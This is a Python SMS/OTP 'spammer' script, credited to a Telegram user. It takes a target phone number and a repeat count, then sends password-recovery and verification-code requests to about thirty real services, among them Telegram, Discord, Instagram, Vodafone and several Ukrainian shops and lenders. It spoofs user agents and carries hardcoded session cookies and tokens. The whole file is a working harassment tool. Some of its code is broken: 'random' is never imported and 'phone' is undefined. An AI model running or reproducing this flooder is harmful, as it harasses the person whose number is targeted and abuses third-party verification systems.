#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
import requests,fake_useragent,time,os,threading
from threading import Thread
from rich.console import Console
from rich.progress import *
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console = Console()

os.system('cls' if os.name == 'nt' else 'clear')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console.print('''[bold red]
 Создатель - Hironotori
 Telegram - @Hironotori
 Человек которий сильно помог - @GGClubbb
''')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
number = input('Beeante HOMeP tenedona: (бes + ')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
for _ in track(range(run)):
 headers = {"User-Agent": fake_useragent.UserAgent().random}
 try:#ok
         requests.post('https://epicentrk.ua/api/person/v1/user/recoverypassword/sendrecoverycode/', data={'LANG_ID': 'ua','USER_LOGIN': '+' + number}, headers={'X-Requested-With':'XMLHttpRequest', 'p3p': 'policyref="/bitrix/p3p.xml", CP="NON DSP COR CUR ADM DEV PSA PSD OUR UNR BUS UNI COM NAV INT DEM STA"', 'strict-transport-security': 'max-age=15552000; includeSubDomains; preload', 'x-content-type-options': 'nosniff', 'x-frame-options': 'SAMEORIGIN', 'x-powered-by': 'PHP/7.4.25', 'x-powered-cms': 'Bitrix Site Manager (4bc356218be26e889085d220a9e786a6)', 'cookie': 'PHPSESSID=1t269iinndd7md5sqo8b7700ek; LANG=ua; LANG_SUBDOMAIN=ua; store-id=2; BITRIX_SM_LOCATION=def50200d1678734f41f460bcd67c0e7f652714c1d25112350930f045277c17c3fb7e18849564c70e87aff0cb6bdb7fb67ecb0f52d6c1f94ba2cd85eb71a663570f93e7c082af1b70d2dc0699c0fb92fbc1e91bb41207d55050bb0224e2049f81fb29a2b4d5d6a7539faad7f65c9ae4ecd446f2896174b6748a8b10ede7882533e4999299a0f81d0b443d6373f63abf0d4d77a0386c8a62ae62d4c5757efee8f1b9509531f037e80f3f36d177b52881abc9f9015eecb07a4cb6e96dc6dd1982b36c818a2c2204b33c9569da3b7dbc5cad5f5f533e9675802fe8eed5281c1395a5119240aa78011dbe5fb77c1d90995b614055cfeb2c5c0bd353151860c9c80f69d92e4459d62564c278acd490258744932689aaba880b2342988af8fce68527affbded359f5b8708c302a333dde73759c0fdf40a5ccc91180d1f372489007258c4daa195f06c65dcdde2dc4a2bfd9b840e1e70a8618cffeaff22df24bf4ddb740a4f1c303fa7c2c763c939fee7348d03aacd73f7fcfe6078a8497a90d143aa1d3fff2eb11a3e1e9e6fe984b7ae7737130645e4e8b9a37a482b36756a8c8f9210007219ddae33a4fe03dfc228771214786ad545a8f9609e470997effe16605c67292944fce82b5ead32856b755e854f0b23175b6e6a07f0a6a4909de9a0c9a27c4f622ebabeee2fbfc79e6767b8cfa5454ee04288b428606b2b7f8f06488379e59b7b82c84cc7637b8dee7dc4bdc66953e5c17943b028a0309ac2b808c27af7f7e48829e001815b729e95cc5e2e679e6b0597f506b32299651230a809f9831c19d0f8f60bf591323b85f09252505f23ded9779ec7a79b03835ae8cf22ce74933b69310979b3c2b51c630b9c2947e8b3bb6e37e8e86a7f11c97246a0e69f98d9f2b4119fd4f414817d14e88becaf74dec96c8fd19793f148465e34d5686192f8bec785f9769c68257a7d66e53c57959e910b52c72d62175c4ae80bb9807b88402ec75baea52fcb6798aaf0207652aefd32f398b61fe122141945a6728ad39266236784689291f53321c340e49cbfbbc848102bcd88adc3a1d6ccb5cf7e194077788dd8e29df092422a975a811e342476ef5ac9a6c666300f522bcf6efab10665930ca8cabcae0bf36bd79180f88e1faad119b77424df67ef529e4ff99c7d0f; BITRIX_SM_SALE_UID=923039850; __cf_bm=m.Ou9mYjkunw4v3prk5KThV3IsEiJ8jVbYutsIO8HQc-1635883869-0-AZdGHS57eMlrlhw5HODImuySQ6oD7owXlUEaV/ADBv28dDvqGGuJxLP5qXXIcIRcJqINHsgInJbBO9hIeRsCTUk=; _gcl_au=1.1.329786748.1635883887; epic_digital_sid=7889b9f5142983dee7f317fd460b3dc3; sc=8DC29604-D83A-CA43-1D7A-AEA55625A39A; BX_USER_ID=e9be5297d091d2b0a0648651770a6910; _gid=GA1.2.1712308472.1635883935; _hjid=367b87a5-a8e4-49df-9b28-e8bba9438837; _hjFirstSeen=1; _gaexp=GAX1.2.WlLos1ScS0WHGIPl3C-mtA.19018.x578; _dc_gtm_UA-69938460-2=1; _dc_gtm_UA-56814631-1=1; _dc_gtm_UA-69938460-1=1; _gat_UA-69938460-2=1; _hjIncludedInSessionSample=0; _hjAbsoluteSessionInProgress=0; _ga_VC9M164SVX=GS1.1.1635883886.1.1.1635883963.43; _ga=GA1.2.437891472.1635883935', 'referer': 'https://epicentrk.ua/ua/personal/restore/?forgot_password=yes&backurl=%2Fua%2Fpersonal%2Flogin%2F', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
         print('epicentrk.ua')
 except:
         print('Не доставлена (epicentrk.ua)')
 try:#ok
         requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": number}, headers=headers)
         print('my.xtra.tv')
 except:
         print('Не отправлено (my.xtra.tv)')
 try:#ok
         requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "login": "Сергей", "phone": number, "stage": "1"}, headers=headers)
         print('bi.ua')
 except:
         print('Не отправлено (bi.ua)')
 try:#ok
         requests.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", "identity": number}, headers=headers)
         print('ctrs')
 except:
         print('Не отправлено (ctrs)')
 try:#ok
         requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
         print('telegram')
 except:
         print('Не отправлено (telegram)')
 try:#no
         requests.post("https://u.icq.net/api/v70/rapi/auth/sendCoden", params={"phone": number, "devId": "ic1rtwz1s1Hj1O0r"}, headers=headers)
         print('icq')
 except:
        print('Не отправлено (icq)')
 try:#ok/no
         requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, headers=headers)
         print('discord')
 except:
         print('Не отправлено (discord)')
 try:#ok
         requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
         print('vodafone')
 except:
         print('Не отправлено (vodafone)')
 try:#ok
         requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+" + number}, headers=headers)
         print('megasport')
 except:
         print('Не отправлено (megasport)')
 try:#ok
         requests.post("https://zolotakoroleva.ua/api/send-otp", json={"params": {"phone": "+" + number}}, headers=headers)
         print('zolotakoroleva.ua')
 except:
         print('Не отправлено (zolotakoroleva.ua)')
 try:#ok
         requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, headers=headers)
         print('mozayka.com.ua')
 except:
         print('Не отправлено (mozayka.com.ua)')
 try:#ok
         requests.post("https://kazan-divan.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers)
         print('kazan-divan.eatery.club')
 except:
         print('Не доставлено (kazan-divan.eatery.club)')
 try:#ok
         requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, headers=headers)
         print('groshivsim.com')
 except:
         print('Не отправлено (groshivsim.com)')
 try:#ok
         requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers)
         print('money4you.ua')
 except:
         print('Не отправлено (money4you.ua)')
 try:
         requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/', data={'email_or_username': number}, headers={'accept-encoding':'gzip, deflate, br', 'accept-language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7','content-type':'application/x-www-form-urlencoded', 'cookie':'ig_did=06389D42-D5BA-42C2-BCA6-49C2913D682B; csrftoken=SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL; mid=XyIqeAALAAF1N7j0GbPCNuWhznuX; rur=FRC; urlgen="{\"109.252.48.249\": 25513\054 \"109.252.48.225\": 25513}:1k5JBz:E-7UgfDDLsdtlKvXiWBUphtFMdw"','referer':'https://www.instagram.com/accounts/password/reset/', 'origin':'https://www.instagram.com','user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 OPR/69.0.3686.95 (Edition Yx)','x-csrftoken':'SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL', 'x-ig-app-id':'936619743392459','x-instagram-ajax': 'a9aec8fa634f', 'x-requested-with': 'XMLHttpRequest'})
         print('instagram.com')
 except:
         print('Не отправлено (instagram.com)')
 try:
         requests.post('https://cabinet.taximaxim.ru/Services/Public.svc/api/v2/login/code/droppedcall/send?device=Xiaomi%2FMi+9T+Pro%2F10&locale=uk&source=playmarket&city=297&udid=ef94a46599d0e604&version=3.12.20&density=xxhdpi&platform=CLAPP_ANDROID&latitude=48.2552685&radius=47.861&rt=154436.516&longitude=25.9334519&sig=1411965450e7f390089c2cfab52ef029', json={'locale': 'uk','phone': number,'type':'droppedcall','smstoken':'vEMdSjfFO6R','isDefault':'1','mcc':'255'}, headers={'X-Requested-With':'XMLHttpRequest', 'Accept-Charset':'UTF-8', 'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 10; Mi 9T Pro MIUI/V12.0.6.0.QFKMIXM)', 'X-Client-RequestTimeout':'10', 'Dark-Theme':'false', 'Url-Scheme':'maximzakaz', 'Connection':'Connection', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'DNT':'1'})
         print('cabinet.taximaxim.ru')
 except:
         print('Не отправлено (cabinet.taximaxim.ru)')
 try:
         requests.post('https://md-fashion.com.ua/bpm/validate-contact', data={'phone': '+' + number}, headers=headers)
         print('md-fashion.com.ua')
 except:
         print('Не отправлено (md-fashion.com.ua)')
 try:#numberis
         requests.post('https://be.budusushi.ua/login', data={'LoginForm[username]': phone[2:]}, headers={'X-Requested-With':'XMLHttpRequest', 'cookie': 'PHPSESSID=ql5hs8fs8bounfjnbehgrncrel; _gcl_au=1.1.1732122179.1637071555; _ga=GA1.2.781960988.1637071555; _gid=GA1.2.978787047.1637071555; _gat_UA-106901939-3=1', 'referer': 'https://budusushi.ua/', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36', 'DNT':'1'})
         print('be.budusushi.ua')
 except:
         print('Не отправлено (be.budusushi.ua)')
 try:
         requests.post('https://cp.soscredit.ua/graphql/portal', json={'operationName':'phoneVerification','variables':{'phone': '+' + number},'query':'mutation phoneVerification($phone: String!) {\n  phoneVerification(phone: $phone)\n}\n'}, headers={'X-Requested-With':'XMLHttpRequest', 'Cookie': 'lang=uk; device=efe1de42-b98b-454d-a621-347cd7d540b8; _gcl_au=1.1.1115308632.1634117698; _ga=GA1.2.612502580.1634117698; _hjid=933c789a-d48d-4173-9677-dc0ea09f9488; PHPSESSID=e17647c02c9f6cdae53a71c53c2604ce; cpaClickId=d15b045c-9bac-47d4-87bb-6a71137dc339; credit={"amount":3000,"term":15,"product_params_id":"26474253"}; promocode=; _gid=GA1.2.706473100.1635343152; _gaclientid=612502580.1634117698; sessionId=20211027|06098436; _gahitid=16:59:12; soscredit.ua_UTM=&utm_source=cpa&utm_medium=soscredit_partners_4; _dc_gtm_UA-88906892-1=1; _dc_gtm_UA-88906892-3=1; _hjAbsoluteSessionInProgress=1', 'Referer': 'https://cabinet.soscredit.ua/', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
         print('soscredit.ua')
 except:
         print('Не отправлено (soscredit.ua)')
 try:
         requests.post('https://dnipro-m.ua/uk/phone-verification/', data={'phone': number}, headers={'X-Requested-With':'XMLHttpRequest', 'x-xss-protection': '1; mode=block', 'cookie': 'PHPSESSID=mjgof64ae33gd9g4rpto23utbs; session_hash=ecf0f036b9519cd8eae6640d1cb07bc2; gclid=939156d81035356c746423ecca0a2cf4a2748f879bd3dc65cfa6250fb7064ccea%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22gclid%22%3Bi%3A1%3Bs%3A8%3A%22dnipro-m%22%3B%7D; language=0480298520a8be04ccfd813520616a13a8aa0fb2db683a1126b77f187eca16c3a%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22language%22%3Bi%3A1%3Bs%3A2%3A%22uk%22%3B%7D; translations_pushed=92f83c1f3a434aeae744854c974cdb236df315cbe39e518ed7234b1ea9a0cd88a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22translations_pushed%22%3Bi%3A1%3Bi%3A1%3B%7D; _csrf-frontend=bef2130445b5ccea33c7703f35273eab653c9ac5572def7b93a0fb02b25a556ca%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22SqzDL32pQojiQqc2Y50FzsdgD6Pmq8ma%22%3B%7D; _gcl_au=1.1.271637781.1635439209; _gcl_aw=GCL.1635439211.Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB; ab_1=2; _gid=GA1.2.377104572.1635439214; _dc_gtm_UA-87493814-1=1; _hjid=1ba8c8eb-f5de-4eb6-b07d-54a7b2e30c70; _hjFirstSeen=1; sc=C91E5BF3-A5C7-774E-FA5A-76E87C65E828; _gat_UA-87493814-1=1; _hjIncludedInSessionSample=0; _hjAbsoluteSessionInProgress=0; _ga_1QMTESJ6M0=GS1.1.1635439214.1.0.1635439215.59; _ga=GA1.2.2011064152.1635439214; __zlcmid=16mkRHVrtBTC1Fc; _gac_UA-87493814-1=1.1635439240.Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB', 'referer': 'https://dnipro-m.ua/uk/?gclid=Cj0KCQjwlOmLBhCHARIsAGiJg7nuZzkVRYJJqzll_6EIBpIhK-TSb115GL3I5dVBdU9enJlXJrN7s0QaAqRqEALw_wcB', 'x-csrf-token': 'koW-Ul6Vmcd9-M963uo7FTOT3bZQyePOrFDxs4Si7S3B9MQWEqartyyXpROPm1gnaqbt8Cq6h6noZqHe9ZqATA==', 'x-requested-with': 'XMLHttpRequest', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
         print('dnipro-m.ua')
 except:
         print('Не отправлено (dnipro-m.ua)')
 try:
         requests.post('https://rider.uklon.com.ua/api/v1/phone/send-code', json={'username':'+' + number}, headers={'X-Requested-With':'XMLHttpRequest', 'strict-transport-security': 'max-age=15724800; includeSubDomains', 'x-correlation-id': 'c3208fdf-4dd7-4bca-aa84-2c686c1e2f60', 'sentry-trace': '796731cc91f54825a3e0435bebc67587-a104fb30d8b1adfc-1', 'uklon-agent': 'UklonPwa/1.16.0.182484', 'referer': 'https://m.uklon.com.ua/', 'locale': 'uk', 'client_id': '04F2BB99734848E1A061140A7452D1A9', 'app_uid': '9e33ffae-0ffd-4361-8bed-869b9ec94cb1', 'city': 'kyiv', 'cf-ray': '6a7f973a9ac12319-KBP', 'content-length': '0', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
         print('uklon.com.ua')
 except:
         print('Не отправлено (uklon.com.ua)')
 try:
         requests.post('https://ucb.z.apteka24.ua/api/send/otp', json={'phone':number}, headers={'X-Requested-With':'XMLHttpRequest', 'link': '<https://ucb.z.apteka24.ua/api/docs.jsonld>; rel="http://www.w3.org/ns/hydra/core#apiDocumentation"', 'server': 'nginx/1.17.10', 'vary': 'Accept', 'x-content-type-options': 'nosniff', 'x-frame-options': 'deny', 'x-powered-by': 'PHP/7.4.21', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache, private', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
         print('apteka24.ua')
 except:
         print('Не отправлено (apteka24.ua)')
 try:
         requests.post('https://anc.ua/authorization/auth/v2/register', json={'login':'+' + number}, headers={'X-Requested-With':'XMLHttpRequest', 'server': 'cloudflare', 'strict-transport-security': 'max-age=15724800; includeSubDomains', 'x-content-type-options': 'nosniff', 'x-frame-options': 'DENY', 'x-xss-protection': '1; mode=block' , 'cookie': 'i18n_redirected=ru; sc=78E5A248-BB67-8529-17FB-C576B2F0C2C6; _gid=GA1.2.932161565.1636350376; _ga=GA1.2.323331122.1636350376; _gcl_au=1.1.1182428524.1636350380; _hjid=b16352a7-11da-4f6f-964a-b39c79b0686e; _hjFirstSeen=1; _hjAbsoluteSessionInProgress=0; _clck=1sxn18j|1|ew9|0; _clsk=oley8v|1636350383248|1|1|e.clarity.ms/collect; _ga_36VHWFTBMP=GS1.1.1636350372.1.1.1636350470.60; _dc_gtm_UA-169190421-1=1', 'referer': 'https://anc.ua/ru', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache, no-store, max-age=0, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
         print('anc.ua')
 except:
         print('Не отправлено (anc.ua)')
 try:#numberis
         requests.post('https://cscapp.vodafone.ua/eai_smob/start.swe?SWEExtSource=JSONConverter&SWEExtCmd=Execute', json={'params':{'version':'2.1.2','language':'ua','source':'WebApp','token':'null','manufacture':'','childNumber':'','accessType':'','spinner':'1'},'requests':{'loginV2':{'id':phone[3:]}}}, headers={'X-Requested-With':'XMLHttpRequest', 'SWEExtSource': 'JSONConverter', 'SWEExtCmd': 'Execute', 'vary': 'Accept-Encoding', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
         print('cscapp.vodafone.ua')
 except:
         print('Не отправлено (cscapp.vodafone.ua)')
 try:#numberis
         requests.post('https://bilshe.mastercard.ua/app/api/check-signup-phone', json={'phone':phone[2:],'password':'#6ujKK%%AfsXkey1','confirmPassword':'#6ujKK%%AfsXkey1'}, headers={'X-Requested-With':'XMLHttpRequest', 'X-XSS-Protection': '1; mode=block', 'Cookie': 'cookiesession1=678B28B9XYZABCDEFGHIJKMNOPQR31C6; OptanonAlertBoxClosed=2021-10-28T18:41:50.742Z; OptanonConsent=isIABGlobal=false&datestamp=Thu+Oct+28+2021+21%3A41%3A50+GMT%2B0300+(%D0%B7%D0%B0+%D1%81%D1%85%D1%96%D0%B4%D0%BD%D0%BE%D1%94%D0%B2%D1%80%D0%BE%D0%BF%D0%B5%D0%B9%D1%81%D1%8C%D0%BA%D0%B8%D0%BC+%D0%BB%D1%96%D1%82%D0%BD%D1%96%D0%BC+%D1%87%D0%B0%D1%81%D0%BE%D0%BC)&version=6.10.0&consentId=c931c9d0-2e56-4fd0-8406-75335c3441e6&interactionCount=1&landingPath=NotLandingPage&groups=C015%3A1%2CC016%3A1%2CC0001%3A1%2CC006%3A1%2CC0002%3A1&hosts=H144%3A1%2CH244%3A1%2CH245%3A1%2CH247%3A1; AMCVS_919F3704532951060A490D44%40AdobeOrg=1; AMCV_919F3704532951060A490D44%40AdobeOrg=-1124106680%7CMCMID%7C19357445073970705823786156474307046252%7CMCAAMLH-1636051311%7C6%7CMCAAMB-1636051311%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1635453711s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C5.2.0; s_vnum=1666982511413%26vn%3D1; s_invisit=true; gpv_pn=no%20value; s_cc=true; s_nr=1635446557193-New; s_sq=masterc601%3D%2526c.%2526a.%2526activitymap.%2526page%253Dhttps%25253A%25252F%25252Fbilshe.mastercard.ua%25252F%2526link%253D%2525D0%25259F%2525D0%2525A0%2525D0%25259E%2525D0%252594%2525D0%25259E%2525D0%252592%2525D0%252596%2525D0%252598%2525D0%2525A2%2525D0%252598%2526region%253Droot%2526.activitymap%2526.a%2526.c%2526pid%253Dhttps%25253A%25252F%25252Fbilshe.mastercard.ua%25252F%2526oid%253D%2525D0%25259F%2525D0%2525A0%2525D0%25259E%2525D0%252594%2525D0%25259E%2525D0%252592%2525D0%252596%2525D0%252598%2525D0%2525A2%2525D0%252598%2526oidt%253D3%2526ot%253DSUBMIT', 'Referer': 'https://bilshe.mastercard.ua/signup', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control': 'no-cache, private', 'Cache-Control': 'max-age=31536000', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
         print('bilshe.mastercard.ua')
 except:
         print('Не отправлено (bilshe.mastercard.ua)')
 try:
         requests.post('https://cabinet.skarb.com.ua/user/register', data={'_csrf': 'mG9Ke7hr_W-jNPBrIONmoYcy4_yhohb65oCkznNj2RruKnw13wWJG-htyAdkmwH3wEW2xcfjTMit5pGlKRXgLA==','login': '+' + number,'password': 'as23Afs312','subscribe': '0','subscribe': '1'}, headers={'X-Requested-With':'XMLHttpRequest', 'strict-transport-security': 'max-age=300;', 'cookie': 'PHPSESSID=9caf7faf4ea190ac1af68c81cf564e12; _csrf=bdcd3f1b1d4fcd9630fbccd675c6c621e778b9dc164ae0b824a47490bc77b251a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22vE6NgnttKY8lDxgVGwU9fAZ2Kf5kZv96%22%3B%7D; _hjid=ac40cfb3-3566-4f11-80e6-03fa308b762c; _hjFirstSeen=1; _ga=GA1.3.1320069702.1635787230; _gid=GA1.3.666518449.1635787230; _gat_UA-168694557-1=1; label_entry=ascbiiu; _hjAbsoluteSessionInProgress=0; carrotquest_device_guid=46f523f6-661a-40db-a58f-1f08a03ba975; carrotquest_uid=1037496607563582470; carrotquest_auth_token=user.1037496607563582470.20750-1fe4d375c930f1f6c1c80e0db5.5cd10bb1f419ffc0f8a08c1b206fffc14213b56ba506f318; carrotquest_realtime_services_transport=wss; carrotquest_session=iu41d6pco8da14aputbtp7l5snvrtc9l; carrotquest_session_started=1', 'referer': 'https://cabinet.skarb.com.ua/user/register', 'upgrade-insecure-requests': '1', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'max-age=0', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
         print('cabinet.skarb.com.ua')
 except:
         print('Не отправлено (cabinet.skarb.com.ua)')
 try:
         requests.post('https://www.nl.ua/ua/personal/', data={'component': 'bxmaker.authuserphone.login','method': 'sendCode','phone': '+' + number,'registration': 'N'}, headers={'X-Requested-With':'XMLHttpRequest', 'cookie': 'PHPSESSID=87j12if7v9o5h0li1jq578fc84; BITRIX_SM_SALE_UID=f506434edf6959334514c71583fee9cf; cookiesession1=678A3E0DPQRSTUV0123456789834B123; _gid=GA1.2.633615997.1636801270; _gac_UA-12429852-1=1.1636801270.Cj0KCQiA4b2MBhD2ARIsAIrcB-SlOsPHMhWXxIZo4CNY8wplpmXy1hCO9iHF41lN13Pd5M6z_4NAGQ8aAidDEALw_wcB; _gat_gtag_UA_12429852_1=1; _gcl_aw=GCL.1636801270.Cj0KCQiA4b2MBhD2ARIsAIrcB-SlOsPHMhWXxIZo4CNY8wplpmXy1hCO9iHF41lN13Pd5M6z_4NAGQ8aAidDEALw_wcB; _gcl_au=1.1.915257014.1636801270; _ga_8ZPHLHGVS0=GS1.1.1636801269.1.1.1636801272.0; _ga=GA1.2.122356831.1636801270', 'referer': 'https://www.nl.ua/ua/personal/', 'referrer-policy': 'no-referrer-when-downgrade', 'server': 'nginx/1.20.1', 'strict-transport-security': 'max-age=31536000;', 'vary': 'Accept-Encoding,User-Agent', 'x-powered-by': 'PHP/5.6.40', 'x-powered-cms': 'Bitrix Site Manager (23046a56eefe26b07f835119ad2f8f24)', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate, post-check=0, pre-check=0', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36', 'DNT':'1'})
         print('nl.ua')
 except:
         print('Не отправлено (nl.ua)')
